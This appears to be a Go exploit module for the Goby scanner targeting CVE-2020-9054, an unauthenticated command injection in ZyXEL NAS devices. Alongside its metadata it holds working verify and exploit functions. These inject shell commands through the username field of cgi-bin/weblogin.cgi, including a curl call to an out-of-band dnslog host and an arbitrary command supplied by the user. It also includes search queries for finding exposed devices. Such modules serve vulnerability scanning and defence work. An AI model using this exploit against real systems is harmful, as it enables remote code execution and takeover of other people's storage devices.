package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "ZyXEL NAS RCE (CVE-2020-9054)",
    "Description": "<p>Many ZyXEL products use NAS326 with firmware versions prior to V5.21 (AAZF.7) C0; NAS520 with firmware versions prior to V5.21 (AASZ.3) C0; and firmware versions prior to V5.21 (AATB.4) C0 NAS540; NAS542 using firmware versions prior to V5.21 (ABAG.4) C0; ZyXEL NSA210; ZyXEL NSA220; ZyXEL NSA220+; ZyXEL NSA221; ZyXEL NSA310; ZyXEL NSA310S; ZyXEL NSA320; ZyXEL NSA320S; ZyXEL NSA325;</p><p>Many ZyXEL products have operating system command injection vulnerabilities. Remote attackers can use this vulnerability to execute arbitrary code and obtain server permissions with the help of specially crafted HTTP POST or GET requests.</p>",
    "Impact": "ZyXEL NAS RCE (CVE-2020-9054)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.zyxel.com/support/remote-code-execution-vulnerability-of-NAS-products.shtml\">https://www.zyxel.com/support/remote-code-execution-vulnerability-of-NAS-products.shtml</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "ZyXEL",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "ZyXEL 网络连接存储 NAS 设备远程命令执行漏洞（CVE-2020-9054）",
            "Description": "<p>多款ZyXEL产品使用V5.21(AAZF.7)C0之前版本固件的NAS326；使用V5.21(AASZ.3)C0之前版本固件的NAS520；使用V5.21(AATB.4)C0之前版本固件的NAS540；使用V5.21(ABAG.4)C0之前版本固件的NAS542；ZyXEL NSA210；ZyXEL NSA220；ZyXEL NSA220+；ZyXEL NSA221；ZyXEL NSA310；ZyXEL NSA310S；ZyXEL NSA320；ZyXEL NSA320S；ZyXEL NSA325；ZyXEL NSA325v2。</p><p>多款ZyXEL产品中存在操作系统命令注入漏洞。远程攻击者可借助特制的HTTP POST或GET请求利用该漏洞执行任意代码，获取服务器权限。</p>",
            "Impact": "<p>多款ZyXEL产品中存在操作系统命令注入漏洞。远程攻击者可借助特制的HTTP POST或GET请求利用该漏洞执行任意代码，获取服务器权限。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.zyxel.com/support/remote-code-execution-vulnerability-of-NAS-products.shtml\">https://www.zyxel.com/support/remote-code-execution-vulnerability-of-NAS-products.shtml</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "ZyXEL",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "ZyXEL NAS RCE (CVE-2020-9054)",
            "Description": "<p>Many ZyXEL products use NAS326 with firmware versions prior to V5.21 (AAZF.7) C0; NAS520 with firmware versions prior to V5.21 (AASZ.3) C0; and firmware versions prior to V5.21 (AATB.4) C0 NAS540; NAS542 using firmware versions prior to V5.21 (ABAG.4) C0; ZyXEL NSA210; ZyXEL NSA220; ZyXEL NSA220+; ZyXEL NSA221; ZyXEL NSA310; ZyXEL NSA310S; ZyXEL NSA320; ZyXEL NSA320S; ZyXEL NSA325;</p><p>Many ZyXEL products have operating system command injection vulnerabilities. Remote attackers can use this vulnerability to execute arbitrary code and obtain server permissions with the help of specially crafted HTTP POST or GET requests.</p>",
            "Impact": "ZyXEL NAS RCE (CVE-2020-9054)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://www.zyxel.com/support/remote-code-execution-vulnerability-of-NAS-products.shtml\">https://www.zyxel.com/support/remote-code-execution-vulnerability-of-NAS-products.shtml</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "ZyXEL",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "cert=\"NAS326\"||banner=\"NAS326\"||cert=\"NAS520\"||banner=\"NAS520\"||cert=\"NAS540\"||banner=\"NAS540\"||cert=\"NAS542\"||banner=\"NAS542\"||body=\"/zyxel/login.html\"",
    "GobyQuery": "cert=\"NAS326\"||banner=\"NAS326\"||cert=\"NAS520\"||banner=\"NAS520\"||cert=\"NAS540\"||banner=\"NAS540\"||cert=\"NAS542\"||banner=\"NAS542\"||body=\"/zyxel/login.html\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.zyxel.com/",
    "DisclosureDate": "2020-03-08",
    "References": [
        "https://nosec.org/home/detail/4159.html"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.0",
    "CVEIDs": [
        "CVE-2020-9054"
    ],
    "CNVD": [
        "CNVD-2020-15993"
    ],
    "CNNVD": [
        "CNNVD-202002-1216"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "dnslog",
            "type": "input",
            "value": "curl xxx.dnslog.cn",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10248"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			uri := "/"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				URLFIND := fmt.Sprintf("%s", resp.Request.URL)
				Path := ""
				if strings.Contains(URLFIND, "index") {
					PathFind := regexp.MustCompile(fmt.Sprintf("%s(.*?)index", u.FixedHostInfo)).FindStringSubmatch(URLFIND)
					Path = PathFind[1]
				} else if strings.Contains(URLFIND, "login") {
					PathFind := regexp.MustCompile(fmt.Sprintf("%s(.*?)login", u.FixedHostInfo)).FindStringSubmatch(URLFIND)
					Path = PathFind[1]
				}
				uri1 := Path + "cgi-bin/weblogin.cgi"
				cfg1 := httpclient.NewPostRequestConfig(uri1)
				cfg1.VerifyTls = false
				cfg1.FollowRedirect = false
				cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg1.Data = fmt.Sprintf("password=asdf&username=admin';curl %s #", checkUrl)
				httpclient.DoHttpRequest(u, cfg1)
				return godclient.PullExists(checkStr, time.Second*10)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["dnslog"].(string)
			uri := "/"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = true
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				URLFIND := fmt.Sprintf("%s", resp.Request.URL)
				Path := ""
				if strings.Contains(URLFIND, "index") {
					PathFind := regexp.MustCompile(fmt.Sprintf("%s(.*?)index", expResult.HostInfo.FixedHostInfo)).FindStringSubmatch(URLFIND)
					Path = PathFind[1]
				} else if strings.Contains(URLFIND, "login") {
					PathFind := regexp.MustCompile(fmt.Sprintf("%s(.*?)login", expResult.HostInfo.FixedHostInfo)).FindStringSubmatch(URLFIND)
					Path = PathFind[1]
				}
				uri1 := Path + "cgi-bin/weblogin.cgi"
				cfg1 := httpclient.NewPostRequestConfig(uri1)
				cfg1.VerifyTls = false
				cfg1.FollowRedirect = false
				cfg1.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				cfg1.Data = fmt.Sprintf("password=asdf&username=admin';%s #", cmd)
				if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
					expResult.Output = "it is a blind rce, see your dnslog!\n\n" + resp1.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
